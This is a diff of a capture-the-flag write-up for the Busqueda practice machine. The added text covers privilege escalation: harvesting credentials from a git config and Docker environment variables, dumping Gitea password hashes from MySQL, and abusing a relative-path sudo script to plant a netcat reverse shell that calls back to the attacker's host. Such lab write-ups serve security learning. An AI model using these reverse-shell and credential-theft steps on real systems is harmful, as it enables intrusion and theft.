@@ -13,10 +13,10 @@ image:
 
 [**Busqueda**](https://app.hackthebox.com/machines/Busqueda) is an Easy Difficulty Linux machine that involves exploiting a command injection (CI) vulnerability, finding credentials in a configuration file and Docker containers. 
 
-**Initial foothold**:  
+**Initial foothold**  
 	By leveraging a CI vulnerability present in a `Python` module, we gain user-level access to the machine. 
 
-**Privilege escalation**:  
+**Privilege escalation**  
 	To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system check-up script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user's `Gitea` account. Further analysis of the system check-up script's source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.
 
 ## Information gathering
@@ -75,17 +75,9 @@ PORT   STATE SERVICE VERSION
 # directory fuzzing
 $ ffuf -u http://searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v
 
-[Status: 200, Size: 15262, Words: 1156, Lines: 330, Duration: 2013ms]
-| URL | http://gitea.searcher.htb/administrator
-    * FUZZ: administrator
-
-[Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 403ms]
-| URL | http://gitea.searcher.htb/v2
-    * FUZZ: v2
-
-[Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 28ms]
-| URL | http://gitea.searcher.htb/server-status
-    * FUZZ: server-status
+[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 104ms]
+| URL | http://searcher.htb/search
+    * FUZZ: search
 
 # sub-domain fuzzing
 $ ffuf -u http://FUZZ.searcher.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac -ic
@@ -104,7 +96,7 @@ gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Dura
 3. Visit sub-domain via browser
 4. Directory fuzzing for vhost
 5. Learn about `Gitea` and `Werkzeug`
-6. Search for known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
+6. Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
 
 ## Step 2
 
@@ -118,15 +110,13 @@ $ grep htb /etc/hosts
 
 ### Search known vulns for `Searchor 2.4.0`
 
-![](googleSearchor.png)
+![](googleSearchor.png){: .normal width="70%"}
 
 ### Visit sub-domain via browser
 
-![](giteaHome.png)
-
 ![](giteaVersion.png)
 
-![](giteaUsers.png)
+![](giteaUsers.png){: .normal}
 
 ### Directory fuzzing for vhost
 
@@ -137,17 +127,17 @@ $ ffuf -u http://gitea.searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Co
 
 ### Learn about `Gitea` and `Werkzeug`
 
-According to its [documentation](https://docs.gitea.com/):
+According to Gitea's [documentation](https://docs.gitea.com/):
 
 > **Gitea** _is a painless self-hosted all-in-one software development service, it includes Git hosting, code review, team collaboration, package registry and CI/CD. It is similar to GitHub, Bitbucket and GitLab. The goal of this project is to provide the easiest, fastest, and most painless way of setting up a self-hosted Git service._
 
-Based on [Werkzeug's documentation](https://werkzeug.palletsprojects.com/en/3.0.x/):
+Based on [testdriven.io](https://testdriven.io/blog/what-is-werkzeug/):
 
 >_werkzeug_ German noun: “tool”. Etymology: _werk_ (“work”), _zeug_ (“stuff”)
+>
+> **Werkzeug** _is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python_. **A WSGI (Web Server Gateway Interface)** _server is necessary for Python web applications since a web server cannot communicate directly with Python_. **WSGI is an interface between a web server and a Python-based web application**. _Put another way, **Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server**._
 
-> **Werkzeug** _is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries._
-
-### Search for known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
+### Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
 
 Nothing interesting comes up.
 
@@ -202,9 +192,9 @@ In order to brute force the login form we need to first obtain the appropriate i
 
 	![](testLogin.png)
 
-2. The fail login message is: `Username or password is incorrect.`:
+2. The fail login message is `Username or password is incorrect.`:
 
-	![](errorMsg.png)
+	![](errorMsg.png){: .normal}
 
 3. The `POST` request parameters are: 
 
@@ -215,7 +205,7 @@ In order to brute force the login form we need to first obtain the appropriate i
 	_csrf=KFFUC4l7C5mnfe_ObzIWX3rMLgs6MTcwNjU1NjQxOTE0Mjk5OTQwOQ&user_name=test&password=test
 	```
 
-Now, we are ready to create a user list with just the 2 usernames and then attempt a dictionary attack:
+Now, we are ready to create a user list with just the 2 usernames and attempt a dictionary attack:
 
 ```bash
 # create a user list
@@ -229,9 +219,353 @@ $ hydra -L userList -P /usr/share/wordlists/rockyou.txt 10.10.11.208 http-post-f
 Unfortunately, nothing comes back!
 ### To-do
 
-1. Search for privilege escalation paths:
+1. Stabilize shell
+2. Search for privilege escalation paths:
 	- SUIDs
-	- Kernel version
-	- Sensitive data within config files
+	- Kernel version and OS version
+	- Sensitive data and config files
 
 ## Step 4
+
+### Stabilize shell
+
+```bash
+# stabilize shell
+svc@busqueda:/var/www/app$ which python3
+which python3
+/usr/bin/python3
+svc@busqueda:/var/www/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+svc@busqueda:/var/www/app$ ^Z
+[1]+  Stopped                 nc -lvnp 9001
+
+┌──(kali㉿CSpanias)-[~]
+└─$ stty raw -echo; fg
+nc -lvnp 9001
+
+svc@busqueda:/var/www/app$
+```
+
+### Search for privilege escalation paths
+
+#### SUIDS
+
+```bash
+# search for SUID files
+svc@busqueda:/var/www/app$ find / -perm -u=s 2>/dev/null
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/fusermount3
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/snap/core20/1822/usr/bin/chfn
+/snap/core20/1822/usr/bin/chsh
+/snap/core20/1822/usr/bin/gpasswd
+/snap/core20/1822/usr/bin/mount
+/snap/core20/1822/usr/bin/newgrp
+/snap/core20/1822/usr/bin/passwd
+/snap/core20/1822/usr/bin/su
+/snap/core20/1822/usr/bin/sudo
+/snap/core20/1822/usr/bin/umount
+/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1822/usr/lib/openssh/ssh-keysign
+/snap/snapd/18357/usr/lib/snapd/snap-confine
+```
+
+#### Kernel and OS version
+
+```bash
+# check kernel version
+svc@busqueda:/var/www/app$ uname -a
+Linux busqueda 5.15.0-69-generic #76-Ubuntu SMP Fri Mar 17 17:19:29 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+# check OS version
+svc@busqueda:/var/www/app$ cat  /etc/os-release
+PRETTY_NAME="Ubuntu 22.04.2 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.2 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+```
+
+#### Sensitive data and config files
+
+```bash
+svc@busqueda:/var/www/app$ ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
+drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4096 Jan 30 06:28 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+
+svc@busqueda:/var/www/app/.git$ cat .git/config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+```
+
+We already know that there is a user `cody`, and the above looks like its credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try logging in as well as use the same creds to SSH either as `cody` or `svc`:
+
+![](gitea_cody.png)
+
+Not much we can do from the sub-domain. Let's try to SSH:
+
+```bash
+# SSH as cody
+ssh cody@10.10.11.208
+cody@10.10.11.208's password:
+Permission denied, please try again.
+
+# ssh as svc
+ssh svc@10.10.11.208
+svc@10.10.11.208's password:
+svc@busqueda:~$
+```
+
+First, we can check if the user `svc` can run anything with elevated privileges:
+
+```bash
+# check for sudo permissions
+svc@busqueda:/$ sudo -l
+[sudo] password for svc:
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+# check file permissions
+svc@busqueda:/$ ls -la /opt/scripts/system-checkup.py
+-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
+```
+
+We can't read the file, but the asterisk (`*`) at the end means that when `system-checkup.py` is executed, it also executes all the files within its directory:
+
+```bash
+# list directory contents
+svc@busqueda:/$ ls -la opt/scripts/
+total 28
+drwxr-xr-x 3 root root 4096 Dec 24  2022 .
+drwxr-xr-x 4 root root 4096 Mar  1  2023 ..
+-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
+-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
+drwxr-x--- 8 root root 4096 Apr  3  2023 .git
+-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
+-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
+
+# check directory permissions
+svc@busqueda:/$ ls -ld /opt/scripts
+drwxr-xr-x 3 root root 4096 Dec 24  2022 /opt/scripts
+```
+
+It seems that we can't read or modify anything within the `scripts` directory. Let's just execute it then:
+
+```bash
+# execute the script
+svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+[sudo] password for svc:
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+# pass the first argument
+svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS             PORTS
+                      NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   12 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   12 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+
+# pass the second argument
+svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+
+# pass the third argument
+svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+Something went wrong
+```
+
+The `docker-inspect` argument seems to require two arguments itself: `format` and `container_name`. Upon searching for the command, it seems that it is actually an official Docker command and the [`--format`](https://docs.docker.com/engine/reference/commandline/inspect/#options) refers to the output's format:
+
+>_The output is quite large, so we can use the [`jq`](https://jqlang.github.io/jq/tutorial/) tool to beautify it and make it more readable._
+
+```bash
+# execute the script with the required arguments
+svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' f84a6b33fb5a | jq
+<SNIP>
+    "Env": [
+      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
+      "MYSQL_USER=gitea",
+      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
+      "MYSQL_DATABASE=gitea",
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "GOSU_VERSION=1.14",
+      "MYSQL_MAJOR=8.0",
+      "MYSQL_VERSION=8.0.31-1.el8",
+      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
+<SNIP>
+```
+
+It seems that it contains some credentials: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. We can check if an MySQL server is listening and if it is, then trying logging in:
+
+```bash
+# log into mysql
+svc@busqueda:/$ mysql -u gitea -pyuiu1hoiu4i5ho1uh -h 127.0.0.1 -D gitea
+<SNIP>
+
+mysql> show tables;
++---------------------------+
+| Tables_in_gitea           |
++---------------------------+
+<SNIP>
+| user                      |
+<SNIP>
++---------------------------+
+91 rows in set (0.00 sec)
+
+mysql> select * from user limit 1 \G
+*************************** 1. row ***************************
+                            id: 1
+                    lower_name: administrator
+                          name: administrator
+                     full_name:
+                         email: administrator@gitea.searcher.htb
+            keep_email_private: 0
+email_notifications_preference: enabled
+                        passwd: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+              passwd_hash_algo: pbkdf2
+          must_change_password: 0
+                    login_type: 0
+                  login_source: 0
+                    login_name:
+                          type: 0
+                      location:
+                       website:
+                         rands: 44748ed806accc9d96bf9f495979b742
+                          salt: a378d3f64143b284f104c926b8b49dfb
+                      language: en-US
+                   description:
+                  created_unix: 1672857920
+                  updated_unix: 1680531979
+               last_login_unix: 1673083022
+          last_repo_visibility: 1
+             max_repo_creation: -1
+                     is_active: 1
+                      is_admin: 1
+                 is_restricted: 0
+                allow_git_hook: 0
+            allow_import_local: 0
+     allow_create_organization: 1
+                prohibit_login: 0
+                        avatar:
+                  avatar_email: administrator@gitea.searcher.htb
+             use_custom_avatar: 0
+                 num_followers: 0
+                 num_following: 0
+                     num_stars: 0
+                     num_repos: 1
+                     num_teams: 0
+                   num_members: 0
+                    visibility: 0
+ repo_admin_change_team_access: 0
+               diff_view_style:
+                         theme: auto
+         keep_activity_private: 0
+1 row in set (0.00 sec)
+
+ERROR:
+No query specified
+
+mysql> select name, passwd from user;
++---------------+------------------------------------------------------------------------------------------------------+
+| name          | passwd                                                                                               |
++---------------+------------------------------------------------------------------------------------------------------+
+| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
+| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
++---------------+------------------------------------------------------------------------------------------------------+
+2 rows in set (0.00 sec)
+```
+
+We have found some hashed passwords, but we already have the password for `cody` as well as the `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF` which we haven't used yet. Let's try logging in `gitea.searcher.htb` as `administrator:jI86kGUuj87guWr3RyF` or `administrator:yuiu1hoiu4i5ho1uh` prior trying to crack the hashes:
+
+![](gitea_admin.png)
+
+The second pair of creds worked; we have now admin access to the sub-domain. We can see the `system-checkup.py` script which we can run as `root` with the `svc` user. Upon inspecting the script, we notice that there is a `./full-checkup.sh` argument:
+
+```python
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+```
+
+The argument is referenced using a relative path (`./full-checkup.sh`) instead of an absolute path (`/opt/scripts/full-checkup.sh`), which means that script will look for the file from the directory where it is been executed. As a result, we could change to a directory where `svc` has write privileges, create a revershe shell script named `full-checkup.sh` and then execute `system-checkup.py` with `sudo` which will results in giving us a `root` revershe shell back:
+
+>_More info about relative vs. absolute paths [here](https://cspanias.github.io/posts/HTB-Precious/#extra)._
+
+```bash
+# open a listener
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+```
+
+```bash
+# change to the /home directory
+svc@busqueda:/$ cd ~
+# create our reverse shell code
+svc@busqueda:~$ nano full-checkup.sh
+# give execute permissions to the script
+svc@busqueda:~$ chmod +x full-checkup.sh
+# display the file's content
+svc@busqueda:~$ cat full-checkup.sh
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.12 1337 >/tmp/f
+# check file's permissions
+svc@busqueda:~$ ls -l full-checkup.sh
+-rwxrwxr-x 1 svc svc 87 Jan 30 08:16 full-checkup.sh
+# execute the command with elevated privileges
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+```
+
+```bash
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 60178
+# cat /root/root.txt
+d2feae7ce4475771813e67abcb2da871
+```
+
+![](machine_pwned.png){: width="75%" .normal}
